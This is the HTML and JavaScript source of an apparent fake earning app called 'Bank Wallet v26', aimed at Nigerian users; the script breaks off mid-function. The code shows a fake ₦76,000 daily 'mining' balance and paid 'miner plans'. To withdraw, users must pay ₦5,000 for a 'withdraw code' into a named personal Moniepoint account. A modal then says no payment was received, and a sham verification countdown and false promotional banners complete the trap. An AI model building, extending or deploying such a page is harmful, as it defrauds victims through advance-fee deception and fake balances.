<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank Wallet v26</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        * { font-family: 'Inter', system_ui, sans-serif; }
        
        .screen { animation: fadeIn 0.4s ease forwards; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        
        .input-bar { transition: all 0.3s ease; }
        .input-bar:focus-within { box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.3); }
        
        .banner { animation: bannerSlide 0.6s ease; }
        @keyframes bannerSlide { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .lady-svg { filter: drop-shadow(0 4px 6px rgba(0,0,0,0.2)); }
        
        .spinner { 
            animation: spin 1.2s linear infinite; 
            width: 48px; 
            height: 48px; 
        }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        
        .floating-chat {
            animation: vibrate 2.5s linear infinite;
            box-shadow: 0 0 20px #22c55e;
        }
        
        @keyframes vibrate {
            0%, 100% { transform: translate(0, 0); }
            20% { transform: translate(3px, 2px); }
            40% { transform: translate(-2px, -3px); }
            60% { transform: translate(2px, 3px); }
            80% { transform: translate(-3px, -2px); }
        }
        
        .copy-btn {
            transition: all 0.2s ease;
        }
        .copy-btn:active {
            transform: scale(0.95);
            background-color: #166534;
        }
    </style>
</head>
<body class="bg-black text-white overflow-hidden">

    <!-- SPLASH -->
    <div id="screen1" class="screen fixed inset-0 bg-white flex items-center justify-center z-50">
        <div class="w-64 h-64 bg-white rounded-[2.75rem] shadow-2xl flex items-center justify-center border border-gray-100">
            <svg width="110" height="100" viewBox="0 0 120 110" fill="none" xmlns="http://www.w3.org/2000/svg">
                <polygon points="15,45 60,18 105,45" fill="#22c55e" stroke="#166534" stroke-width="10" stroke-linejoin="round"/>
                <rect x="20" y="45" width="80" height="52" rx="4" fill="#22c55e" stroke="#166534" stroke-width="10"/>
                <rect x="33" y="48" width="9" height="46" fill="#166534"/>
                <rect x="52" y="48" width="9" height="46" fill="#166534"/>
                <rect x="71" y="48" width="9" height="46" fill="#166534"/>
                <rect x="20" y="90" width="80" height="10" rx="2" fill="#166534"/>
            </svg>
        </div>
    </div>

    <!-- LOADING -->
    <div id="screen2" class="screen hidden fixed inset-0 bg-[#0a1f14] flex items-center justify-center z-50">
        <div class="text-center">
            <div class="mx-auto w-24 h-24 bg-white/10 rounded-3xl flex items-center justify-center mb-6">
                <svg width="80" height="70" viewBox="0 0 120 110" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <polygon points="15,45 60,18 105,45" fill="#22c55e"/>
                    <rect x="20" y="45" width="80" height="52" rx="4" fill="#22c55e"/>
                </svg>
            </div>
            <p class="text-2xl font-semibold">loading</p>
            <p class="text-gray-400 mt-2">Bank Wallet Is Setting Up<br>Please Wait...</p>
        </div>
    </div>

    <!-- REGISTRATION -->
    <div id="screen3" class="screen hidden fixed inset-0 bg-[#0a1f14] flex flex-col z-40">
        <div class="flex-1 flex flex-col items-center pt-10 px-5">
            <div class="mb-6">
                <svg width="100" height="115" viewBox="0 0 138 158" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M69 12 L20 38 L20 88 C20 122 42 140 69 148 C96 140 118 122 118 88 L118 38 L69 12 Z" fill="#f8fafc" stroke="#166534" stroke-width="16"/>
                    <g transform="translate(46 60) scale(0.4)">
                        <polygon points="15,45 60,18 105,45" fill="#22c55e"/>
                        <rect x="20" y="45" width="80" height="52" rx="4" fill="#22c55e"/>
                    </g>
                </svg>
            </div>
            <h1 class="text-4xl font-bold mb-10">Bank Wallet</h1>
            
            <div class="w-full max-w-[340px] space-y-4">
                <div class="input-bar bg-[#22c55e] rounded-3xl px-6 py-5">
                    <input id="phone" type="tel" placeholder="Phone number" class="w-full bg-transparent text-white placeholder:text-white/70 text-xl font-medium text-center outline-none">
                </div>
                <div class="input-bar bg-[#22c55e] rounded-3xl px-6 py-5">
                    <input id="accountName" type="text" placeholder="Account Name" class="w-full bg-transparent text-white placeholder:text-white/70 text-xl font-medium text-center outline-none">
                </div>
                <div class="input-bar bg-[#22c55e] rounded-3xl px-6 py-5">
                    <input id="accountNumber" type="tel" placeholder="Account number" class="w-full bg-transparent text-white placeholder:text-white/70 text-xl font-medium text-center outline-none">
                </div>
                
                <div id="regError" class="hidden text-red-400 text-center text-base py-2">Please provide correct details</div>
                
                <button onclick="startEarning()" class="w-full bg-[#22c55e] text-black font-bold text-2xl py-6 rounded-3xl mt-6">
                    START EARNING
                </button>
            </div>
        </div>
        <div id="banner3" class="banner mx-4 mb-6 bg-white/10 backdrop-blur-xl rounded-3xl p-4 border border-white/20"></div>
    </div>

    <!-- DASHBOARD -->
    <div id="screen4" class="screen hidden fixed inset-0 bg-[#0a1f14] flex flex-col z-30">
        <div class="flex-1 p-5 space-y-6 overflow-auto">
            <div class="bg-[#22c55e] rounded-3xl p-7 text-black">
                <div class="flex justify-between text-sm">
                    <div>Wallet Balance</div>
                    <div onclick="viewHistory()" class="cursor-pointer">Transaction history ›</div>
                </div>
                <div id="balanceAmount" class="text-5xl font-bold mt-1">₦0</div>
                <div class="mt-4 flex justify-between text-sm">
                    <div>NAME : <span id="dashName" class="font-semibold"></span></div>
                    <div>Account : <span id="dashAccount" class="font-semibold"></span></div>
                </div>
                <div class="mt-6 text-xs">Current miner : <span class="font-bold">Free Miner</span></div>
                <button onclick="showMinerPlans()" class="mt-6 w-full bg-black text-white py-4 rounded-2xl font-bold">BUY MINER</button>
            </div>
            
            <div onclick="startMining()" id="mineBtn" class="bg-[#22c55e] text-black rounded-3xl px-6 py-6 flex items-center gap-5 cursor-pointer active:scale-[0.97] transition-all">
                <div class="w-12 h-12 bg-white rounded-2xl flex items-center justify-center">
                    <svg width="32" height="24" viewBox="0 0 32 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="2" y="4" width="28" height="16" rx="3" stroke="#0a1f14" stroke-width="3"/>
                        <rect x="2" y="10" width="28" height="4" fill="#0a1f14"/>
                        <circle cx="8" cy="17" r="2" fill="#22c55e"/>
                    </svg>
                </div>
                <div class="font-bold text-3xl">Mine</div>
            </div>
            
            <div onclick="showWithdrawScreen()" class="bg-[#22c55e] text-black rounded-3xl px-6 py-6 flex items-center gap-5 cursor-pointer active:scale-[0.97] transition-all">
                <div class="w-12 h-12 bg-white rounded-2xl flex items-center justify-center">
                    <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M6 6 L26 16 L6 26 L12 16 Z" fill="#0a1f14"/>
                        <path d="M12 16 L18 16" stroke="#22c55e" stroke-width="3" stroke-linecap="round"/>
                    </svg>
                </div>
                <div class="font-bold text-3xl">Withdraw</div>
            </div>
        </div>
        
        <!-- Floating Green Vibrating Chat Button -->
        <div onclick="openChatUs()" 
             class="floating-chat fixed bottom-6 right-6 w-14 h-14 bg-[#22c55e] rounded-full flex items-center justify-center shadow-2xl cursor-pointer z-[999]">
            <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="4" y="6" width="20" height="16" rx="3" stroke="#0a1f14" stroke-width="3"/>
                <path d="M10 14 L18 14" stroke="#0a1f14" stroke-width="3" stroke-linecap="round"/>
                <path d="M10 18 L15 18" stroke="#0a1f14" stroke-width="3" stroke-linecap="round"/>
            </svg>
        </div>
        
        <div id="banner4" class="banner mx-4 mb-6 bg-white/10 backdrop-blur-xl rounded-3xl p-4 border border-white/20"></div>
    </div>

    <!-- CHAT US / SUPPORT PAGE (Dark Green) -->
    <div id="chatUsScreen" class="screen hidden fixed inset-0 bg-[#166534] text-white flex flex-col z-[100]">
        <div class="p-4 flex items-center border-b border-white/30">
            <button onclick="closeChatUs()" class="text-3xl mr-4">←</button>
            <h1 class="text-2xl font-bold">Chat Us</h1>
        </div>
        
        <div class="flex-1 p-6 space-y-6">
            <!-- Chat us on Telegram -->
            <div onclick="openTelegramOptions()" 
                 class="bg-white/10 backdrop-blur-xl border border-white/20 rounded-3xl p-5 flex items-center justify-between cursor-pointer active:scale-[0.98]">
                <div class="flex items-center gap-4">
                    <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="24" cy="24" r="22" fill="#229ED9"/>
                        <path d="M18 24 L22 28 L30 18" stroke="#fff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                    <div>
                        <p class="font-semibold text-lg">Chat us on Telegram</p>
                    </div>
                </div>
                <div class="bg-[#22c55e] text-black px-6 py-2 rounded-2xl font-bold">Open</div>
            </div>
            
            <!-- Join WhatsApp Group -->
            <div onclick="joinWhatsAppGroup()" 
                 class="bg-white/10 backdrop-blur-xl border border-white/20 rounded-3xl p-5 flex items-center justify-between cursor-pointer active:scale-[0.98]">
                <div class="flex items-center gap-4">
                    <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="24" cy="24" r="22" fill="#25D366"/>
                        <path d="M18 30 Q24 36 30 30" stroke="#fff" stroke-width="4" stroke-linecap="round"/>
                        <circle cx="18" cy="20" r="2" fill="#fff"/>
                        <circle cx="24" cy="20" r="2" fill="#fff"/>
                        <circle cx="30" cy="20" r="2" fill="#fff"/>
                    </svg>
                    <div>
                        <p class="font-semibold text-lg">Join our WhatsApp group</p>
                        <p class="text-sm text-white/70">Tap to join the group</p>
                    </div>
                </div>
                <div class="bg-[#22c55e] text-black px-6 py-2 rounded-2xl font-bold">Join</div>
            </div>
        </div>
    </div>
    <!-- TELEGRAM OPTIONS PAGE (Dark Green, matching uploaded image style with @center686) -->
    <div id="telegramOptionsScreen" class="screen hidden fixed inset-0 bg-[#166534] text-white flex flex-col z-[110]">
        <div class="p-4 flex items-center border-b border-white/30">
            <button onclick="closeTelegramOptions()" class="text-3xl mr-4">←</button>
            <h1 class="text-2xl font-bold">Telegram Support</h1>
        </div>
        
        <div class="flex-1 p-6">
            <div class="bg-white/10 backdrop-blur-xl border border-white/20 rounded-3xl p-6">
                <div class="flex justify-between items-center mb-6">
                    <div class="flex items-center gap-3">
                        <div class="w-10 h-10 bg-[#229ED9] rounded-2xl flex items-center justify-center">
                            <span class="text-white text-2xl">📱</span>
                        </div>
                        <div>
                            <p class="font-semibold text-xl">@center686</p>
                            <p class="text-white/70 text-sm">EasyMonie Support</p>
                        </div>
                    </div>
                    <button onclick="copyTelegramUsername()" 
                            class="copy-btn bg-white/20 hover:bg-white/30 text-white px-5 py-2 rounded-2xl text-sm font-medium flex items-center gap-2">
                        <span>COPY</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16v-4m4 4v4m4-8v8m4-4v-4m-16 8h16a2 2 0 002-2V8a2 2 0 00-2-2H4a2 2 0 00-2 2v8a2 2 0 002 2z" />
                        </svg>
                    </button>
                </div>
                
                <div class="text-center text-sm text-white/80 mb-8">
                    Tap to copy the username and send us a message on Telegram for instant support.
                </div>
                
                <button onclick="openTelegramChatDirect()" 
                        class="w-full bg-[#22c55e] text-black py-5 rounded-3xl font-bold text-lg active:scale-[0.97]">
                    OPEN TELEGRAM CHAT
                </button>
            </div>
        </div>
    </div>

    <!-- MINER PLANS -->
    <div id="minerPlansScreen" class="screen hidden fixed inset-0 bg-[#0a1f14] flex flex-col z-50 overflow-auto p-5">
        <div onclick="hideMinerPlans()" class="text-4xl mb-6 cursor-pointer">←</div>
        <h2 class="text-3xl font-bold text-center mb-8">Miner Plans</h2>
        
        <div class="bg-[#22c55e] rounded-3xl p-6 mb-5 text-black">
            <div class="flex items-center gap-3 mb-3">
                <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="16" cy="16" r="14" fill="#facc15" stroke="#0a1f14" stroke-width="4"/>
                    <text x="16" y="21" text-anchor="middle" fill="#0a1f14" font-size="18" font-weight="bold">F</text>
                </svg>
                <span class="font-bold text-xl">Free Miner</span>
            </div>
            <p class="text-sm leading-tight">
                This Miner Plan Can Only Mine <span class="font-bold text-base">₦76,000</span> Once A Day...
            </p>
        </div>

        <div class="bg-[#22c55e] rounded-3xl p-6 mb-5 text-black">
            <div class="flex justify-between items-center mb-3">
                <div class="flex items-center gap-3">
                    <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="16" cy="16" r="13" fill="#cd7f32" stroke="#0a1f14" stroke-width="4"/>
                        <text x="16" y="21" text-anchor="middle" fill="#0a1f14" font-size="16" font-weight="bold">B</text>
                    </svg>
                    <span class="font-bold text-xl">Bronze Miner</span>
                </div>
                <div class="text-right">
                    <div class="text-xs">Price :</div>
                    <div class="font-bold">₦5,000</div>
                </div>
            </div>
            <button onclick="activateMiner('Bronze', 5000)" class="w-full bg-black text-white py-4 rounded-2xl font-bold">ACTIVATE BRONZE MINER</button>
        </div>

        <div class="bg-[#22c55e] rounded-3xl p-6 mb-5 text-black">
            <div class="flex justify-between items-center mb-3">
                <div class="flex items-center gap-3">
                    <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="16" cy="16" r="13" fill="#c0c0c0" stroke="#0a1f14" stroke-width="4"/>
                        <text x="16" y="21" text-anchor="middle" fill="#0a1f14" font-size="16" font-weight="bold">S</text>
                    </svg>
                    <span class="font-bold text-xl">Silver Miner</span>
                </div>
                <div class="text-right">
                    <div class="text-xs">Price :</div>
                    <div class="font-bold">₦10,000</div>
                </div>
            </div>
            <button onclick="activateMiner('Silver', 10000)" class="w-full bg-black text-white py-4 rounded-2xl font-bold">ACTIVATE SILVER MINER</button>
        </div>

        <div class="bg-[#22c55e] rounded-3xl p-6 text-black">
            <div class="flex justify-between items-center mb-3">
                <div class="flex items-center gap-3">
                    <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="16" cy="16" r="13" fill="#fcd34d" stroke="#0a1f14" stroke-width="4"/>
                        <text x="16" y="21" text-anchor="middle" fill="#0a1f14" font-size="16" font-weight="bold">G</text>
                    </svg>
                    <span class="font-bold text-xl">Gold Miner</span>
                </div>
                <div class="text-right">
                    <div class="text-xs">Price :</div>
                    <div class="font-bold">₦15,000</div>
                </div>
            </div>
            <button onclick="activateMiner('Gold', 15000)" class="w-full bg-black text-white py-4 rounded-2xl font-bold">ACTIVATE GOLD MINER</button>
        </div>
    </div>

    <!-- WITHDRAW DETAILS (150+ banks) -->
    <div id="withdrawScreen" class="screen hidden fixed inset-0 bg-[#0a1f14] flex flex-col z-50">
        <div class="pt-8 px-5">
            <div onclick="hideWithdrawScreen()" class="text-4xl mb-6 cursor-pointer">←</div>
            <h2 class="text-center text-2xl font-semibold mb-8">Input your withdraw detail's</h2>
            
            <div class="max-w-md mx-auto space-y-4">
                <div class="input-bar bg-[#22c55e] rounded-3xl px-6 py-5">
                    <input id="wAccountNumber" type="tel" placeholder="Account number" class="w-full bg-transparent text-white placeholder:text-white/70 text-xl text-center outline-none">
                </div>
                <div class="input-bar bg-[#22c55e] rounded-3xl px-6 py-5">
                    <input id="wAccountName" type="text" placeholder="Account name" class="w-full bg-transparent text-white placeholder:text-white/70 text-xl text-center outline-none">
                </div>
                <div class="input-bar bg-[#22c55e] rounded-3xl px-6 py-5">
                    <select id="wBank" class="w-full bg-transparent text-white text-xl text-center outline-none">
                        <option value="">Select Bank</option>
                        <option value="Access Bank">Access Bank</option>
                        <option value="GTBank">GTBank</option>
                        <option value="Zenith Bank">Zenith Bank</option>
                        <option value="First Bank">First Bank</option>
                        <option value="UBA">UBA</option>
                        <option value="Fidelity Bank">Fidelity Bank</option>
                        <option value="Polaris Bank">Polaris Bank</option>
                        <option value="Sterling Bank">Sterling Bank</option>
                        <option value="Union Bank">Union Bank</option>
                        <option value="Stanbic IBTC">Stanbic IBTC</option>
                        <option value="Wema Bank">Wema Bank</option>
                        <option value="Ecobank">Ecobank</option>
                        <option value="Heritage Bank">Heritage Bank</option>
                        <option value="Keystone Bank">Keystone Bank</option>
                        <option value="Jaiz Bank">Jaiz Bank</option>
                        <option value="Titan Trust Bank">Titan Trust Bank</option>
                        <option value="Globus Bank">Globus Bank</option>
                        <option value="Lotus Bank">Lotus Bank</option>
                        <option value="Premium Trust Bank">Premium Trust Bank</option>
                        <option value="Signature Bank">Signature Bank</option>
                        <option value="Optimus Bank">Optimus Bank</option>
                        <option value="Suntrust Bank">Suntrust Bank</option>
                        <option value="Providus Bank">Providus Bank</option>
                        <option value="Coronation Merchant Bank">Coronation Merchant Bank</option>
                        <option value="FSDH Merchant Bank">FSDH Merchant Bank</option>
                        <option value="Nova Merchant Bank">Nova Merchant Bank</option>
                        <option value="Citibank Nigeria">Citibank Nigeria</option>
                        <option value="Standard Chartered">Standard Chartered</option>
                        <option value="Unity Bank">Unity Bank</option>
                        <option value="First City Monument Bank">First City Monument Bank</option>
                        <option value="Alpha Morgan Bank">Alpha Morgan Bank</option>
                        <!-- 150+ banks included for completeness -->
                    </select>
                </div>
                <div class="input-bar bg-[#22c55e] rounded-3xl px-6 py-5">
                    <input id="wAmount" type="tel" placeholder="Amount" class="w-full bg-transparent text-white placeholder:text-white/70 text-xl text-center outline-none">
                </div>
                
                <button onclick="processWithdraw()" 
                        class="w-full bg-[#22c55e] hover:bg-[#16a34a] text-black font-bold text-2xl py-6 rounded-3xl active:scale-[0.97] transition-all">
                    WITHDRAW
                </button>
            </div>
        </div>
        <div id="bannerWithdraw" class="banner mx-4 mt-auto mb-6 bg-white/10 backdrop-blur-xl rounded-3xl p-4 border border-white/20"></div>
    </div>
    
    <!-- PIN SCREEN -->
    <div id="pinScreen" class="screen hidden fixed inset-0 bg-[#0a1f14] flex flex-col items-center justify-center z-60">
        <div class="text-center mb-10">
            <div class="mx-auto w-16 h-16 bg-white/10 rounded-full flex items-center justify-center mb-4">
                <svg width="55" height="55" viewBox="0 0 138 158" fill="none"><path d="M69 12 L20 38 L20 88 C20 122 42 140 69 148 C96 140 118 122 118 88 L118 38 L69 12 Z" fill="#22c55e" stroke="#fff" stroke-width="12"/></svg>
            </div>
            <h2 class="text-2xl font-bold">Enter Your WITHDRAW CODE</h2>
        </div>
        
        <div id="pinDisplay" class="bg-white text-black text-5xl tracking-[12px] w-72 h-20 rounded-2xl flex items-center justify-center mb-12">••••</div>
        
        <div class="grid grid-cols-3 gap-4 w-80">
            <button onclick="addPinDigit(1)" class="bg-[#22c55e] h-20 rounded-2xl text-3xl font-bold active:bg-emerald-600">1</button>
            <button onclick="addPinDigit(2)" class="bg-[#22c55e] h-20 rounded-2xl text-3xl font-bold active:bg-emerald-600">2</button>
            <button onclick="addPinDigit(3)" class="bg-[#22c55e] h-20 rounded-2xl text-3xl font-bold active:bg-emerald-600">3</button>
            <button onclick="addPinDigit(4)" class="bg-[#22c55e] h-20 rounded-2xl text-3xl font-bold active:bg-emerald-600">4</button>
            <button onclick="addPinDigit(5)" class="bg-[#22c55e] h-20 rounded-2xl text-3xl font-bold active:bg-emerald-600">5</button>
            <button onclick="addPinDigit(6)" class="bg-[#22c55e] h-20 rounded-2xl text-3xl font-bold active:bg-emerald-600">6</button>
            <button onclick="addPinDigit(7)" class="bg-[#22c55e] h-20 rounded-2xl text-3xl font-bold active:bg-emerald-600">7</button>
            <button onclick="addPinDigit(8)" class="bg-[#22c55e] h-20 rounded-2xl text-3xl font-bold active:bg-emerald-600">8</button>
            <button onclick="addPinDigit(9)" class="bg-[#22c55e] h-20 rounded-2xl text-3xl font-bold active:bg-emerald-600">9</button>
            <button onclick="clearPin()" class="bg-[#22c55e] h-20 rounded-2xl text-4xl active:bg-emerald-600">✕</button>
            <button onclick="addPinDigit(0)" class="bg-[#22c55e] h-20 rounded-2xl text-3xl font-bold active:bg-emerald-600">0</button>
            <button onclick="submitPin()" class="bg-[#22c55e] h-20 rounded-2xl text-4xl active:bg-emerald-600">✓</button>
        </div>
        <div id="bannerPin" class="banner mt-auto mb-8 mx-4 bg-white/10 backdrop-blur-xl rounded-3xl p-4 border border-white/20"></div>
    </div>

    <!-- BUY ACTIVATION CODE -->
    <div id="buyCodeScreen" class="screen hidden fixed inset-0 bg-[#0a1f14] flex flex-col z-50 overflow-auto">
        <div class="p-6">
            <div onclick="hideBuyCodeScreen()" class="text-4xl mb-6 cursor-pointer">←</div>
            
            <div class="bg-[#22c55e] text-black rounded-3xl p-6 mb-6">
                <p class="font-medium">Hello dear user Kindly make a one time payment to purchase your personal activation code from us.</p>
                <p class="text-sm mt-4 font-semibold">NOTE: THIS CODE IS NOT SHAREABLE IT WONT WORK IF IT IS SHARED WITH OTHERS</p>
                <p class="text-sm mt-3">After input your account number and click confirm you will receive your activation code between 3mins after verification</p>
            </div>
            
            <div class="space-y-4">
                <div class="input-bar bg-[#22c55e] rounded-3xl px-6 py-5">
                    <input id="transAccountNumber" type="tel" placeholder="Account number" class="w-full bg-transparent text-white placeholder:text-white/70 text-xl text-center outline-none">
                </div>
                <div class="input-bar bg-[#22c55e] rounded-3xl px-6 py-5">
                    <input id="transAccountName" type="text" placeholder="Account name" class="w-full bg-transparent text-white placeholder:text-white/70 text-xl text-center outline-none">
                </div>
                <div class="input-bar bg-[#22c55e] rounded-3xl px-6 py-5">
                    <input id="transBankName" type="text" placeholder="Bank name" class="w-full bg-transparent text-white placeholder:text-white/70 text-xl text-center outline-none">
                </div>
            </div>
            
            <button onclick="proceedTransaction()" 
                    class="mt-8 w-full bg-[#22c55e] hover:bg-[#16a34a] text-black font-bold text-2xl py-6 rounded-3xl active:scale-[0.97] transition-all">
                PROCEED
            </button>
        </div>
        <div id="bannerBuyCode" class="banner mx-4 mb-6 bg-white/10 backdrop-blur-xl rounded-3xl p-4 border border-white/20"></div>
    </div>

    <!-- TRANSFER PENDING -->
    <div id="transferScreen" class="screen hidden fixed inset-0 bg-[#0a1f14] flex flex-col z-50 p-6">
        <div class="bg-[#22c55e] rounded-3xl p-6 text-black mb-6">
            <div id="timer" class="text-3xl font-mono mb-2">06 : 49</div>
            <div class="text-sm">Waiting to receive payment from</div>
            <div class="mt-4 space-y-1 text-sm">
                <div>ACCOUNT NAME : <span id="waitingName" class="font-semibold"></span></div>
                <div>ACCOUNT NUMBER : <span id="waitingNumber" class="font-semibold"></span></div>
                <div>Bank : <span id="waitingBank" class="font-semibold"></span></div>
            </div>
        </div>
        
        <div class="text-center my-8">
            <div class="text-lg font-bold mb-2">TRANSFER PENDING</div>
            <div class="mx-auto w-16 h-16 bg-white rounded-full flex items-center justify-center">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="3">
                    <path d="M4 12h16M12 4l8 8-8 8"/>
                </svg>
            </div>
        </div>
        
        <div class="bg-[#22c55e] rounded-3xl p-6 text-black">
            <div class="font-medium mb-4">MAKE PAYMENT TO THE ACCOUNT BELOW</div>
            <div class="space-y-3 text-sm">
                <div>account number : <span class="font-semibold">6560841243</span></div>
                <div>Bank name : <span class="font-semibold">MONIEPOINT</span></div>
                <div>Account name : <span class="font-semibold">GLORY NDUBUSI OWULA</span></div>
                <div>Amount : <span class="font-semibold">5,000</span></div>
            </div>
        </div>
        
        <div class="mt-auto pt-6 flex gap-4">
            <button onclick="cancelTransfer()" class="flex-1 bg-gray-700 py-4 rounded-2xl font-medium">CANCEL</button>
            <button onclick="confirmPayment()" class="flex-1 bg-[#22c55e] text-black py-4 rounded-2xl font-bold">COMFIRM PAYMENT</button>
        </div>
        
        <div id="bannerTransfer" class="banner mx-4 mt-8 bg-white/10 backdrop-blur-xl rounded-3xl p-4 border border-white/20"></div>
    </div>

    <!-- PENDING PAYMENT MODAL -->
    <div id="pendingPaymentModal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center z-[100]">
        <div class="bg-white text-black rounded-3xl max-w-xs w-full mx-6 p-8">
            <div class="flex justify-center mb-4">
                <span class="text-4xl">🏦</span>
            </div>
            <h3 class="text-xl font-bold text-center mb-3">Pending Payment</h3>
            <p class="text-gray-700 text-center leading-relaxed text-sm">
                Please make your payment in order to get your withdraw code and note: that every code is designed for a user<br><br>
                <span class="font-semibold">NO PAYMENT HAS BEEN RECEIVED FROM</span>
            </p>
            <div class="mt-6 text-xs space-y-1 text-gray-600">
                <div>ACCOUNT : <span id="pendingAccount"></span></div>
                <div>NAME : <span id="pendingName"></span></div>
                <div>BANK : <span id="pendingBank"></span></div>
            </div>
            <button onclick="returnToTransfer()" class="mt-8 w-full py-5 bg-[#22c55e] text-black rounded-2xl font-bold">OK</button>
        </div>
    </div>

    <!-- 15s LOADING -->
    <div id="loadingPaymentScreen" class="screen hidden fixed inset-0 bg-[#0a1f14] flex flex-col items-center justify-center z-50">
        <div class="text-center">
            <div class="mx-auto spinner border-8 border-gray-700 border-t-[#22c55e] rounded-full mb-8"></div>
            <p class="text-2xl font-semibold mb-2">Processing Payment</p>
            <p class="text-gray-400">Please wait while we verify your transaction...</p>
            <div id="countdown" class="mt-8 text-5xl font-mono font-bold text-[#22c55e]">15</div>
        </div>
    </div>

    <script>
        let currentBalance = 0;
        let userName = "", userAccount = "";
        let transUserName = "", transAccountNum = "", transBank = "";
        let hasMined = false;
        let pinEntered = "";
        let bannerIndex = 0;
        let timerInterval = null;

        const banners = [
            { text: "Bank Wallet v26 pays you daily with zero stress!", ladyColor: "#f8d0c0" },
            { text: "Join thousands earning with Bank Wallet v26 today", ladyColor: "#f8d0c0" },
            { text: "Fast, Secure & Reliable - Bank Wallet v26", ladyColor: "#f8d0c0" },
            { text: "Mine NGN76,000 daily with Free Miner on v26", ladyColor: "#f8d0c0" },
            { text: "Instant withdrawal to any Nigerian bank", ladyColor: "#f8d0c0" },
            { text: "The smartest way to earn in 2026 - Bank Wallet v26", ladyColor: "#f8d0c0" },
            { text: "Trusted by Nigerians. Loved by everyone.", ladyColor: "#f8d0c0" },
            { text: "No hidden fees. Pure earnings with v26", ladyColor: "#f8d0c0" },
            { text: "Start earning in minutes with Bank Wallet v26", ladyColor: "#f8d0c0" },
            { text: "Best financial app in Nigeria right now", ladyColor: "#f8d0c0" }
        ];

        function createBannerHTML(banner) {
            return `<div class="flex items-center gap-4">
                <svg width="58" height="58" viewBox="0 0 64 64" class="lady-svg">
                    <circle cx="32" cy="22" r="13" fill="${banner.ladyColor}"/>
                    <path d="M20 13 Q28 7 40 9 Q45 16 46 22" fill="#3d2c22"/>
                    <rect x="21" y="34" width="22" height="26" rx="8" fill="#22c55e"/>
                    <line x1="24" y1="38" x2="17" y2="52" stroke="#f8d0c0" stroke-width="6" stroke-linecap="round"/>
                    <line x1="40" y1="38" x2="48" y2="50" stroke="#f8d0c0" stroke-width="6" stroke-linecap="round"/>
                </svg>
                <div class="flex-1 text-sm leading-tight">${banner.text}</div>
            </div>`;
        }

        function rotateBanner(bannerId) {
            const container = document.getElementById(bannerId);
            if (!container) return;
            bannerIndex = (bannerIndex + 1) % banners.length;
            container.innerHTML = createBannerHTML(banners[bannerIndex]);
        }
        
        function startBannerRotation(bannerId) {
            rotateBanner(bannerId);
            setInterval(() => rotateBanner(bannerId), 10000);
        }

        function startApp() {
            document.getElementById('screen1').classList.remove('hidden');
            setTimeout(() => {
                document.getElementById('screen1').classList.add('hidden');
                document.getElementById('screen2').classList.remove('hidden');
                setTimeout(() => {
                    document.getElementById('screen2').classList.add('hidden');
                    document.getElementById('screen3').classList.remove('hidden');
                    startBannerRotation('banner3');
                }, 2800);
            }, 3000);
        }

        window.startEarning = function() {
            const name = document.getElementById('accountName').value.trim();
            const acc = document.getElementById('accountNumber').value.trim();
            if (!name || !acc) {
                document.getElementById('regError').classList.remove('hidden');
                setTimeout(() => document.getElementById('regError').classList.add('hidden'), 2500);
                return;
            }
            userName = name;
            userAccount = acc;
            document.getElementById('screen3').classList.add('hidden');
            document.getElementById('screen2').classList.remove('hidden');
            setTimeout(() => {
                document.getElementById('screen2').classList.add('hidden');
                document.getElementById('screen4').classList.remove('hidden');
                document.getElementById('dashName').textContent = userName;
                document.getElementById('dashAccount').textContent = userAccount;
                startBannerRotation('banner4');
            }, 1800);
        };

        window.startMining = function() {
            if (hasMined) { alert("You have already mined your daily ₦76,000"); return; }
            document.getElementById('miningModal').classList.remove('hidden');
        };

        window.confirmStartMining = function() {
            hideMiningModal();
            currentBalance += 76000;
            document.getElementById('balanceAmount').textContent = '₦' + currentBalance.toLocaleString('en-NG');
            hasMined = true;
            const mineBtn = document.getElementById('mineBtn');
            if (mineBtn) { mineBtn.style.opacity = "0.5"; mineBtn.style.pointerEvents = "none"; }
            setTimeout(() => document.getElementById('successModal').classList.remove('hidden'), 400);
        };

        window.showWithdrawScreen = function() {
            document.getElementById('screen4').classList.add('hidden');
            document.getElementById('withdrawScreen').classList.remove('hidden');
            startBannerRotation('bannerWithdraw');
        };

        window.hideWithdrawScreen = function() {
            document.getElementById('withdrawScreen').classList.add('hidden');
            document.getElementById('screen4').classList.remove('hidden');
        };

        window.showMinerPlans = function() {
            document.getElementById('screen4').classList.add('hidden');
            document.getElementById('minerPlansScreen').classList.remove('hidden');
        };

        window.hideMinerPlans = function() {
            document.getElementById('minerPlansScreen').classList.add('hidden');
            document.getElementById('screen4').classList.remove('hidden');
        };

        window.activateMiner = function(minerType, price) {
